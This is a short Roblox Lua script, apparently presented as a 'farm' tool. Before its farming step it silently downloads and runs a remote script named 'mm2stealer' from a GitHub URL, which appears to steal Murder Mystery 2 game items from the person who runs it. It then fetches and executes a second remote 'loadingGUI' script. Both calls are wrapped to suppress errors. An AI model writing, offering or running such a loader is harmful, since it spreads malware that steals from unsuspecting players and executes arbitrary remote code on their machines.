local function stealer(callback)
    pcall(function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptsHub11/mm2stealer/refs/heads/main/mm2stealerr'))()
    end)
    -- Delay just to be safe in case stealer does any UI stuff
    task.delay(1, callback)
end

local function farm()
    local player = game:WaitForChild("Players"):WaitForChild("LocalPlayer")
    player:WaitForChild("PlayerGui")
    wait(1)
    pcall(function()
        local code = game:HttpGet("https://raw.githubusercontent.com/ScriptsHub11/loadingGUI/refs/heads/main/loadingGUI")
        if code and #code > 10 then
            loadstring(code)()
        end
    end)
end

-- Execute stealer first, then farm
stealer(farm)
